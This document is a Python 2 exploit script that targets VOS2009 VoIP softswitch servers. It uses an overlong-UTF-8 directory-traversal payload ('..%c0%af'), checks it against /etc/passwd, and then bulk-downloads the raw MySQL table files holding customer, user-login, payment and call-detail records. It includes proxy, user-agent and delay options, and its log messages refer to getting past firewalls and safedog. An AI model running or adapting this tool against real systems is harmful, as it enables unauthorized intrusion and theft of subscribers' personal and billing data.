#!/usr/bin/python

import requests, re, time
from getopt import getopt, GetoptError
from sys import argv, exit
from os import makedirs, path
from datetime import datetime

target_ip = ''
output_prefix = ''
user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
proxy = ''
rewrite_file = False
retry_count = 1
sleep_sec = 0
enable_verbose = False
table_list = ['e_activephonecard', 'e_bindede164', 'e_calleee164limit', 'e_callere164limit', 'e_cdr', 'e_cdr_template',
              'e_citycode', 'e_currentgifttime', 'e_currentsuite', 'e_customerdetail', 'e_customer', 'e_feeratebytime',
              'e_feerate', 'e_feerategroup', 'e_feeratesection', 'e_gatewaygroup', 'e_gatewaymapping',
              'e_gatewaymappingsetting', 'e_gatewayrouting', 'e_gatewayroutingsetting', 'e_gifttime',
              'e_groupe164', 'e_ivraudiodata', 'e_ivraudio', 'e_ivr', 'e_ivrservice', 'e_ivrservicemenu',
              'e_language', 'e_mbx', 'e_mobilearea', 'e_moconfig', 'e_motimer', 'e_othermaxid', 'e_payhistory',
              'e_phonecard', 'e_phone', 'e_reportcustomerclearingfee', 'e_reportcustomerclearingio', 'e_reportcustomerfee',
              'e_reportcustomerio', 'e_reportgatewayclearingfee', 'e_reportgatewayfee', 'e_reportmanagement',
              'e_reportphonecarde164fee', 'e_reportphonecardfee', 'e_reportphonefee', 'e_shorte164', 'e_suite',
              'e_suiteorder', 'e_syslog', 'e_user', 'e_userlogin', 'r_customer_e164ranges', 'r_feerategroup_privileges',
              'r_suite_privileges']

data_dir_list = [
    '/var/lib/mysql',
    '/data/mysql'
]
data_dir = ''


def log(text):
    with open('vosdb_downloader.log', 'a') as f:
        s = '%s: %s' % (str(datetime.now()), text)
        if enable_verbose:
            print s
        f.write(s + '\r\n')


def gen_prev_date(this_date):
    return datetime.fromordinal(this_date.toordinal()-1)


def exists(filepath):
    if rewrite_file:
        return False

    is_exist = path.exists(filepath)
    return is_exist


def remote_file_exists(url):
    proxies = {
        'http': proxy,
        'https': proxy
    } if proxy else None

    headers = {
        'User-Agent': user_agent
    }

    res = requests.head(url, proxies=proxies, headers=headers)

    return res.status_code == 200


def get(url, rep=0):
    if rep >= retry_count:
        log('Maximum retry counts reached. Exiting.')
        log('Please check if the network connection to target is OK.')
        exit(0)

    resp = object()

    try:
        proxies = {
            'http': proxy,
            'https': proxy
        } if proxy else None

        headers = {
            'User-Agent': user_agent
        }

        time.sleep(sleep_sec)
        resp = requests.get(url, proxies=proxies, headers=headers)

    except requests.exceptions.Timeout:
        log('Timeout error detected: Perhaps target is down or network condition is poor. Retrying...')
        return get(url, rep + 1)
    except requests.exceptions.ConnectionError:
        log('Connection error occurred. Host is down, or firewall or safedog may be present in target. Retrying...')
        return get(url, rep + 1)
    except requests.exceptions.HTTPError:
        log('HTTP error occurred. Host is down, or firewall or safedog may be present in target. Retrying...')
        return get(url, rep + 1)

    return resp


def check_version(ip):
    url = 'http://' + ip
    req = get(url)
    if not re.search('VOS2009', req.content):
        print 'This is not VOS2009 system.'
        exit(0)


def get_download_url(target_ip):
    if len(target_ip) <= 0:
        return False

    url = 'http://%s' % target_ip
    symbol = '..%c0%af'
    count = 0
    while True:
        if count >= 20:
            log('Exploit failed. The target may not have the exploit, equipped with safedog or security patch.')
            exit (1)
        test_req = get('%s/%setc/passwd' % (url, symbol))
        if test_req.status_code == 200:
            # log('Retrieved correct downloading url: %s/%s' % (url, symbol))
            return '%s/%s' % (url, symbol)
        else:
            # log('URL %s/%s is not right. Increasing symbols.' % (url, symbol))
            symbol += '..%c0%af'
            count += 1


def download(url, filename):
    if exists(output_prefix + '/' + filename):
        log('Skipped %s - File already exists.' % filename)
        resp = requests.Response()
        resp.status_code = 200
        return resp

    resp = get(url)
    if resp.status_code == 200:
        log('Successfully downloaded: %s' % filename)
        with open(output_prefix + '/' + filename, 'w') as f:
            f.write(resp.content)
    else:
        log('Cannot download %s - %d. This table may not exist.' % (filename, resp.status_code))

    return resp


def set_data_dir(download_url):
    global data_dir
    if data_dir:
        if not remote_file_exists('%s%s/ibdata1' % (download_url, data_dir)):
            log('Heuristic test shows that MySQL data is not located in %s.' % data_dir)
            return False
        return True
    
    for item in data_dir_list:
        if remote_file_exists('%s%s/ibdata1' % (download_url, item)):
            data_dir = item
            return True
    return False


def download_table(download_url, table_name):
    frm = download('%s%s/vosdb/%s.frm' % (download_url, data_dir, table_name), table_name + '.frm')
    myi = download('%s%s/vosdb/%s.MYI' % (download_url, data_dir, table_name), table_name + '.MYI')
    myd = download('%s%s/vosdb/%s.MYD' % (download_url, data_dir, table_name), table_name + '.MYD')
    return (frm.status_code == 200) or (myi.status_code == 200) or (myd.status_code == 200)


def iterate_tables(download_url):
    log('Downloading fixed tables...')
    for table in table_list:
        download_table(download_url, table)
    log('Iterate date-related tables...')

    is_200ok = True
    idate = datetime.now()
    while is_200ok:
        year = idate.year
        month = idate.month
        day = idate.day

        if download_table(download_url, 'e_cdr_%04d%02d%02d' % (year, month, day)):
            if day == 1:
                download_table(download_url, 'e_reportcustomerfee_%04d%02d' % (year, month))
                download_table(download_url, 'e_reportcustomerfee_%04d%02d' % (year, month))
                download_table(download_url, 'e_reportphonefee_%04d%02d' % (year, month))
            idate = gen_prev_date(idate)
        else:
            log('Download complete.')
            is_200ok = False


def usage():
    print 'Usage: %s [options] <Target Host>\n' % argv[0]
    print '-v, --verbose\t\t Output detailed log to terminal.'
    print '-o, --output=DIR\t Specify output directory.'
    print '-t, --sleep=SECOND\t Specify sleep seconds between every request. The default is 0.'
    print '-r, --retry=X\t\t Specify retry counts when network error occurrs. The default is 0.'
    print '--rewrite\t\t Use this switch to rewrite files even if it exists.'
    print '--user-agent=UA\t\t Specify user agent. Defaults to Chrome\'s.'
    print '--data-dir=PATH\t\t Specify MySQL data files path. If not specified the program will try paths in the data_dir_list.'
    print '--proxy=PROXY\t\t Specify proxy server to use.'


if __name__ == '__main__':

    try:
        options, args = getopt(argv[1:], 'vo:t:r:', 
            ['verbose', 'rewrite', 'output=', 'sleep=', 'retry=', 'user-agent=', 'proxy=', 'data-dir='])

        for key, value in options:
            if key in ('-v', '--verbose'):
                enable_verbose = True
            if key in ('-o', '--output'):
                output_prefix = value
    
            if key in ('-t', '--sleep'):
                sleep_sec = int(value)
            if key in ('-r', '--retry'):
                retry_count = int(value)
            if key in ('--user-agent'):
                user_agent = value
            if key in ('--proxy'):
                proxy = value
            if key == '--rewrite':
                rewrite_file = True
            if key == '--data-dir':
                data_dir = value
    
        target_ip = args[0]
        check_version(target_ip)
        print 'retry: %d' % retry_count
    
        if output_prefix == '':
            output_prefix = './vosdb_' + target_ip
    
        if not path.exists(output_prefix):
            makedirs(output_prefix)
    
        url = get_download_url(target_ip)
        if not set_data_dir(url):
            log('Heuristic test shows that the data files are not located in preset paths. Please try specifying a custom path with \'--data-dir=\'.')
            exit(0)
        iterate_tables(url)
    
    except GetoptError:
        usage()
        exit(0)
    except IndexError:
        usage()
        exit(0)
    except KeyboardInterrupt:
        print 'User abort'
        exit(0)
    
